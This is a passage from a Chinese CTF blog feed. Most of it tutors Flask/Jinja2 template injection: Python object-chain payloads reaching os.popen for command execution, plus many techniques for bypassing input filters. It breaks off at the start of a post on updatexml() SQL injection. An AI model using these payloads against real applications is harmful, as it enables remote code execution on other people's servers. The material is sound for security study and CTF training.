class="comment">#__class__功能和type()函数一样，都是查看对象所在的类（子实例找父实例）。</span></span><br><span class="line"><span class="number">2</span>）__base__</span><br><span class="line"><span class="comment">#__base__的作用是查询一个类的父类。</span></span><br><span class="line"><span class="number">3</span>）__mro__</span><br><span class="line"><span class="comment">#返回包含回朔一个类所由继承过的父类的元组。</span></span><br><span class="line"><span class="number">4</span>）__subclasses__()</span><br><span class="line"><span class="comment">#返回包含一个类的所有子类的列表。</span></span><br><span class="line"><span class="number">5</span>）__builtins__()</span><br><span class="line"><span class="comment">#builtins就是内置模块的一个引用。像__import__()、open、eval等内置函数所在的模块就内置模块。大多数模块都将名称 __builtins__ 作为其全局变量的一部分.</span></span><br><span class="line"><span class="number">6</span>）__init__</span><br><span class="line"><span class="comment">#类实例化出一个对象时进行初始化方法。</span></span><br><span class="line"><span class="number">7</span>）__globals__</span><br><span class="line"><span class="comment">#返回一个函数所在空间的所有类、属性、子模块与方法的字典。</span></span><br><span class="line"><span class="number">8</span>）__dict__</span><br><span class="line"><span class="comment">#返回包含一个模块所拥有类、属性、子模块与方法的字典。</span></span><br><span class="line"><span class="number">9</span>）__getattribute__</span><br><span class="line"><span class="comment">#虽然这个魔术方法该方法可以拦截对对象属性的所有访问企图。但也有访问对象属性的功能。可以用来进行一些绕过。</span></span><br></pre></td></tr></table></figure><h3 id="02-文件操作和命令执行相关的python模块"><a href="#02-文件操作和命令执行相关的python模块" class="headerlink" title="02.文件操作和命令执行相关的python模块"></a>02.文件操作和命令执行相关的python模块</h3><h6 id="1-builtins模块"><a href="#1-builtins模块" class="headerlink" title="1)builtins模块"></a>1)builtins模块</h6><p>是python的一个内置函数所在模块,里面的函数无需import就能访问。</p><ol><li><p>eval()</p><p>执行1句简单的python代码，并返回结果。</p></li><li><p>exec()</p><p>执行多句python代码，但返回值永远为None。</p></li><li><p>open()</p><p>打开一个文件</p></li></ol><h6 id="2）os模块"><a href="#2）os模块" class="headerlink" title="2）os模块"></a>2）os模块</h6><p>该模块提供了一些方便使用操作系统相关功能的函数。这主要说与文件操作和命令执行相关的函数</p><ol><li><p>os.system  (cmd)</p><p>执行操作系统(shell)命令，若执行成功返回值为0。</p></li><li><p>os.popen(cmd)  .read()</p><p>os.popen()函数可以用来执行操作系统(shell)命令。通过read()函数来读取返回结果。除此外还有so.popen2(),so.popen3().</p></li><li><p>os.open(filename)</p><p>可以用来打开读取文件。</p></li></ol><h6 id="3-platform模块"><a href="#3-platform模块" class="headerlink" title="3)platform模块"></a>3)platform模块</h6><p> python中，platform模块给我们提供了很多方法去管理操作系统。</p><ol><li><p>platform.popen(cmd, mode=’r’, bufsize=None) </p><p>platform.popen函数可以用来执行操作系统(shell)命令。但与os.popen()函数通类似过read()函数来读取返回结果。                 </p></li></ol><h6 id="4-timeit-模块"><a href="#4-timeit-模块" class="headerlink" title="4)timeit 模块"></a>4)timeit 模块</h6><p>​        模块中的timeit.timeit() 本是检测性能的，也可以任意代码执行。但是没有回显。用法如timeit.timeit(“<strong>import</strong>(‘os’).system(cmd)”,number=1)         </p><h6 id="5-commands模块"><a href="#5-commands模块" class="headerlink" title="5)commands模块"></a>5)commands模块</h6><p>commands模块只存在于Python 2.7中，且不支持windows平台，因此commands模块很少被使用。另外，commands模块实际上也是通过对os.popen()的封装来完成的。</p><ol><li><p>commands.getoutput(cmd)</p><p>接收字符串格式的命令，执行命令并返回执行结果。</p></li><li><p>commands.getstatusoutput(cmd)</p><p>执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)。</p></li></ol><h6 id="6-subprocess模块"><a href="#6-subprocess模块" class="headerlink" title="6)subprocess模块"></a>6)subprocess模块</h6><p>subprocess 模块允许你生成新的进程，连接它们的输入、输出、错误管道.此模块打算代替一些老旧的模块与功能如：os模块、commands模块等。</p><ol><li><p>subprocess.run(cmd)</p><p>Python 3.5版本以后才有的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例</p></li><li><p>subprocess.call(cmd,shell=True)</p><p>执行由参数提供的命令。我们可以用数组作为参数运行命令，也可以用字符串作为参数运行命令(通过设置参数shell=True)如果执行成功则返回状态码。</p></li><li><p>subprocess.check_call(cmd)</p><p>执行指定的命令，如果执行成功则返回状态码，否则抛出异常.</p></li><li><p>subprocess.check_output(cmd)</p><p>执行指定的命令，如果执行成功则返回结果，否则抛出异常.</p></li><li><p>subprocess.getstatusoutput(cmd)</p><p>执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)。</p></li><li><p>subprocess.getoutput(cmd)</p><p>接收字符串格式的命令，执行命令并返回执行结果。</p></li></ol><h3 id="03-一些提高效率的函数"><a href="#03-一些提高效率的函数" class="headerlink" title="03.一些提高效率的函数"></a>03.一些提高效率的函数</h3><p>1.index()</p><p>检查字符串是否包含某个字符或字符串。还有可以用来查询列表里是否有某个元素。若春在则返回第一次出现时的下标或索引。ps：当参数有.符号时可能出现该函数查不出来但存在的现象（解析逻辑问题）</p><p>2.keys()</p><p>将键的单独提取成一个列表。在某些过滤了中括号的情况下与index()用来代替中括号的效果。</p><h3 id="04-关于flask"><a href="#04-关于flask" class="headerlink" title="04.关于flask"></a>04.关于flask</h3><p>flask由 Jinja2 模板开发而来的web框架。缺省情况下，以下全局变量可以在 Jinja2 模板中使用，同时也值得我们关注：</p><h4 id="1-config"><a href="#1-config" class="headerlink" title="1) config"></a>1) config</h4><p>获取当前配置对象（ flask.config ）,可以得到些配置信息(有点类似php中phpinfo的作用).比如:是否打开session,SECRET_KEY(python默认的session加密方式的密钥）的值。</p><p>在 version 0.10后,这个变量总是可用，甚至是在被导入的模板中。</p><p>这个对象是在 version 0.6. 后才有的.</p><h4 id="2-request"><a href="#2-request" class="headerlink" title="2)request"></a>2)request</h4><p>获取请求对象（ flask.request ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p><h4 id="3-session"><a href="#3-session" class="headerlink" title="3)session"></a>3)session</h4><p>获取当前会话对象（ flask.session ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p><h4 id="4-g"><a href="#4-g" class="headerlink" title="4)g"></a>4)g</h4><p>请求绑定的全局变量（ flask.g ）。在flask中，有一个专门用来存储用户信息的g对象，g的全称的为global。g对象在一次请求中的所有的代码的地方，都是可以使用的。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p><h4 id="5-url-for"><a href="#5-url-for" class="headerlink" title="5)url_for()"></a>5)url_for()</h4><p>flask.url_for() 函数。url_for() 会返回传入的路由函数对应的URL，所谓路由函数就是被 app.route() 路由装饰器装饰的函数。如果我们定义的路由函数是带有参数的，则可以将这些参数作为命名参数传入。</p><h5 id="6-get-flashed-messages"><a href="#6-get-flashed-messages" class="headerlink" title="6)get_flashed_messages()"></a>6)get_flashed_messages()</h5><p>flask.get_flashed_messages() 函数。返回之前在Flask中通过 flash() 传入的信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出。</p><h2 id="0x3ssti注入的一般攻击流程"><a href="#0x3ssti注入的一般攻击流程" class="headerlink" title="0x3ssti注入的一般攻击流程"></a>0x3ssti注入的一般攻击流程</h2><p>1.找到环境中的可以使用的环境变量,例如:内置函数方法（url_for()函数、get_flashed_messages()函数）、内置类的实例变量(‘’,[]，config，self)。</p><p>2.若已得到内置函数方法则跳第4步骤，从内置类的实例变量方向出发的通过类的关系通过<code>__class__、__base__ or  __mro__</code>找到基本类（object类）.注意：python2与python3这步有的差别。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2:</span></span><br><span class="line">  <span class="comment"># __base__路线</span></span><br><span class="line">      <span class="string">''</span>.__class__.__base__.__base__</span><br><span class="line">      <span class="comment">#__mro__路线1</span></span><br><span class="line">       <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"><span class="comment">#python 3:</span></span><br><span class="line">       <span class="comment"># __base__路线</span></span><br><span class="line">       <span class="string">''</span>.__class__.__base__</span><br><span class="line">       <span class="comment">#__mro__路线1</span></span><br><span class="line">        <span class="string">''</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">       </span><br><span class="line"> <span class="comment">#python 2/3 都可以用 的__mro__路线</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><p>3.通过<code>__subclasses__()</code>获取所有object类的子类，并用 <code>__dict__</code>从中寻找类其拥有的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()</span><br><span class="line"><span class="comment">#获取所有object类的子类</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[x].__dict__</span><br><span class="line"><span class="comment">#x表__subclasses__()返回列表的任意存在索引。</span></span><br><span class="line"><span class="comment">#__dict__ 中带有&lt;function __init__ at 0x7f8a189dc320&gt;  或&lt;unbound method WarningMessage.__init__&gt;就是我们可以利用的方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#大多数类重载的了__init__方法，__init__方法也有__globals__属性。因此我们可以直接遍历x找带有__init__的类。</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[x].__init__</span><br></pre></td></tr></table></figure><p>4.通过<code>__globals__</code>或<code>func_globals</code>得到的方法所在空间的所有类、属性、子模块与方法。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">url_for.func_globals</span><br><span class="line">url_for.__globals__</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.__globals__</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].reset.__globals__</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].reset.func_globals</span><br></pre></td></tr></table></figure><p>5若上一步返回的结果里有需要的方法就可以直接调用;若想调用内置库的函数用<strong>builtins</strong> ;若想调用第三方库（模块）可以继续用<strong>import</strong>载入:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#若上一步返回的结果里有需要的方法就可以直接调用;</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals.getreader</span><br><span class="line"><span class="comment">#若想调用内置库的函数,利用__builtins__属性:</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals.__builtins__.eval()</span><br><span class="line"><span class="comment">#若想调用第三方库（模块）可以后加__import__载入;</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals.__builtins__.__import__(<span class="string">'os'</span>).popen</span><br></pre></td></tr></table></figure><h2 id="0x4常见绕过方式"><a href="#0x4常见绕过方式" class="headerlink" title="0x4常见绕过方式"></a>0x4常见绕过方式</h2><h6 id="1-过滤中括号"><a href="#1-过滤中括号" class="headerlink" title="1)过滤中括号"></a>1)过滤中括号</h6><ol><li><p><code>__getitem__</code>方法，该方法用来获取指定索引对应的元素。</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">40</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">79</span>).__init__.__globals__.__builtins__.__getitem__(<span class="string">'ord'</span>)</span><br><span class="line"><span class="comment">#这个操作对字典与列表都适用</span></span><br></pre></td></tr></table></figure><p>来获取<code>__mro__</code>所得元组的最后一个元素和<code>__subclasses__()</code>返回的列表里的索引为40的元素。</p></li><li><p>对于列表来,pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。我们可以用pop() 来代替中括号。里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过。例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__base__.__subclasses__().pop(<span class="number">40</span>)</span><br><span class="line"><span class="comment">#这个只能用于列表</span></span><br></pre></td></tr></table></figure><p>来获得<code>__subclasses__()</code>返回的列表里的索引为40的元素。</p></li><li><p>对于字典来说,可以用’.’号来代替.在flask中的<code></code>号里’.’号有代替<code>[ ]</code>对字典进行索引读取的作用.例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">79</span>).__init__.__globals__.__builtins__.ord</span><br><span class="line"><span class="comment">#这个只能用于字典</span></span><br></pre></td></tr></table></figure><p>来获得<code>__builtins__</code>返回的列表里的索引为’ord’的元素。</p></li></ol><h6 id="2-过滤双下划线"><a href="#2-过滤双下划线" class="headerlink" title="2)过滤双下划线"></a>2)过滤双下划线</h6><ol><li><p>request.args 是flask中的一个属性,为返回请求的参数,这里自己设置一个变量名,将后面的路径传值进来,进而绕过了’_’的过滤.</p><p>例如：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;""[request.args.class][request.args.x1][request.args.x2][request.args.x3]()[40]&#125;&#125;?class=__class__&amp;x1=__base__&amp;x2=__base__&amp;x3=__subclasses__</span><br></pre></td></tr></table></figure><p>通过自己设置变量class、x1、x2、x3来传递参数从而绕过。</p></li><li><p>同request.args，request.values也有类似的作用，不过要利用post的方式进行传参。</p></li><li><p>在<code>dir()</code>没有被ban下可以用<code>dir(0)[0][0]</code>来引入’_’.</p><p>例： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">'class'</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]]</span><br><span class="line"><span class="comment">#等价于''.__class__（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>利用格式化字符串特性。用<code>&#39;{0:c}&#39;[&#39;format&#39;](95)</code>或<code>&quot;%c&quot;%(95)</code></p><p>以<code>&#39;&#39;.__class__</code>例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>[<span class="string">'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)+<span class="string">'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)+<span class="string">'class'</span>+<span class="string">'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)+<span class="string">'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure></li></ol><h6 id="3-过滤了’-’号"><a href="#3-过滤了’-’号" class="headerlink" title="3)过滤了’.’号"></a>3)过滤了’.’号</h6><ol><li><p>用中括号来代替。</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'__class__'</span>]等价于<span class="string">''</span>.__class__</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>用<code>__getattribute__</code>函数来代替</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__getattribute__(<span class="string">'__class__'</span>)</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>用<code>attr()</code>函数来代替</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'__class'</span>__]等价于<span class="string">''</span>|attr(<span class="string">'__class__'</span>)</span><br></pre></td></tr></table></figure></li></ol><h6 id="4-关键词字符过滤"><a href="#4-关键词字符过滤" class="headerlink" title="4)关键词字符过滤"></a>4)关键词字符过滤</h6><ol><li><p>利用字符串特性将关键词拆绕过。</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'__cl'</span>+<span class="string">'ass__'</span>]等价于<span class="string">''</span>.__class__</span><br><span class="line"><span class="comment">#（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br><span class="line"><span class="string">''</span>.__getattribute__(<span class="string">'__cla'</span>+<span class="string">'ss__'</span>)</span><br><span class="line"><span class="comment">#（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'__class'</span>__]等价于<span class="string">''</span>|attr(<span class="string">'__cla'</span>+<span class="string">'ss__'</span>)</span><br></pre></td></tr></table></figure></li><li><p>在<code>dir()</code>或<code>__dir__()</code>没有被ban下利用<code>dir()</code>或<code>__dir__()</code>返回值进行拼接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">''</span>.__dir__()[<span class="number">18</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">4</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">1</span>][<span class="number">3</span>]+<span class="string">''</span>.__dir__()[<span class="number">2</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">2</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]]</span><br><span class="line"><span class="comment">#在我的环境中，等价于__class__</span></span><br><span class="line"><span class="comment">#''.__dir__()[0][0]=='_'</span></span><br><span class="line"><span class="comment">#''.__dir__()[18][2]==‘c’</span></span><br><span class="line"><span class="comment">#''.__dir__()[4][2]=='a'</span></span><br><span class="line"><span class="comment">#''.__dir__()[1][3]=='l'</span></span><br><span class="line"><span class="comment">#''.__dir__()[2][2]=='s'</span></span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>‘%c’.format()与’{0:c}’.format()拼接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>[<span class="string">'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">99</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">108</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">97</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">115</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">115</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)]&#125;&#125;等价于<span class="string">''</span>.__class__</span><br><span class="line"><span class="comment">#（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>进行decode解编码绕过。</p><p>例:1.进行base64处理<code>__class__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'X19jbGFzc19f'</span>.decode(<span class="string">'base64'</span>)]</span><br></pre></td></tr></table></figure><p>例:2.进行16进制处理<code>__class__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'5f5f636c6173735f5f'</span>.decode(<span class="string">'hex'</span>)]</span><br></pre></td></tr></table></figure><p>例:3.进行rot13 编码处理<code>__class__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'__pynff__'</span>.decode(<span class="string">'rot13'</span>)]</span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>利用request.args，request.values进行传参.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;""[request.args.class][request.args.x1][request.args.x2][request.args.x3]()[40]&#125;&#125;?class=__class__&amp;x1=__base__&amp;x2=__base__&amp;x3=__subclasses__</span><br></pre></td></tr></table></figure><p>若’.’也被过滤可以用’[]’套娃方式代替</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;""[request['args']['c']]&#125;&#125;?c=__class__</span><br></pre></td></tr></table></figure></li><li><p>利用全角符号来绕过字母过滤(大多数非字母字符不能绕过,python3环境?)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ｏｐｅｎ</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;function io.open(file, mode=<span class="string">'r'</span>, buffering=<span class="number">-1</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span>, opener=<span class="literal">None</span>)&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>＿＿ｉｍｐｏｒｔ</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> File <span class="string">"&lt;ipython-input-2-78bf7df85c1c&gt;"</span>, line <span class="number">1</span></span><br><span class="line">    ＿＿ｉｍｐｏｒｔ</span><br><span class="line">           ^</span><br><span class="line">SyntaxError: invalid character <span class="keyword">in</span> identifier</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__ｉｍｐｏｒｔ__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> &lt;function __import__&gt;</span><br></pre></td></tr></table></figure><p>7.利用模板渲染编码绕过：（部分版本）</p><p>​     7.1：16进制（<code>\xXX</code>）绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'\x5F\x5F\x63\x6C\x61\x73\x73\x5F\x5F'</span>]  <span class="comment">#''.__class__</span></span><br></pre></td></tr></table></figure><p>​     7.2：8进制（<code>\OOO</code>）绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'\137\137\143\154\141\163\163\137\137'</span>]  <span class="comment">#''.__class__</span></span><br></pre></td></tr></table></figure><p>​     7.3：unicode（<code>\uXXXX</code>or<code>\UXXXXXXXX</code>）绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\uXXXX:</span><br><span class="line">    <span class="string">''</span>[<span class="string">'\u005F\u005F\u0063\u006C\u0061\u0073\u0073\u005F\u005F'</span>]  <span class="comment">#''.__class__</span></span><br><span class="line">\UXXXXXXXX:</span><br><span class="line">    <span class="string">''</span>[<span class="string">'\U0000005F\U0000005F\U00000063\U0000006C\U00000061\U00000073\U00000073\U0000005F\U0000005F'</span>]  <span class="comment">#''.__class__</span></span><br></pre></td></tr></table></figure></li></ol><h6 id="5-过滤了‘-’or‘-’"><a href="#5-过滤了‘-’or‘-’" class="headerlink" title="5)过滤了‘{ {’or‘} }’"></a>5)过滤了‘{ {’or‘} }’</h6><p>可以用<code>{ % % }</code>来代替<code>{ {} }</code>，但要注意两者区别： <code>{ {} }</code>是用来变量取值，<code>{ { % % } }</code>是用来控制结构。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">'1'</span>==<span class="string">'code'</span> %&#125;lexsD6&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h2 id="0x0参考文献"><a href="#0x0参考文献" class="headerlink" title="0x0参考文献"></a>0x0参考文献</h2><p>1.<a href="https://blog.csdn.net/answer3lin/article/details/86572575" target="_blank" rel="noopener">https://blog.csdn.net/answer3lin/article/details/86572575</a></p><p>2.<a href="https://docs.python.org/zh-cn/3/" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/</a></p><p>3.<a href="https://www.anquanke.com/post/id/188172#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188172#h3-2</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于updatexml()报错注入的思考</title>
      <link href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01updatexml-的正常作用"><a href="#0x01updatexml-的正常作用" class="headerlink" title="0x01updatexml()的正常作用"></a>0x01updatexml()的正常作用</h2><p>updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。<a id="more"></a>其正常语法：<br><code>UPDATEXML (XML_document, XPath_string, new_value);</code><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p><p>如下是关于它正常用法的掩饰。</p><p>(1)执行如下sql语言创建环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE  xml1 (xxx VARCHAR(150));#创建一个表</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexsd6&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;frist xml date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第一个数据</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexs&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;secend xml 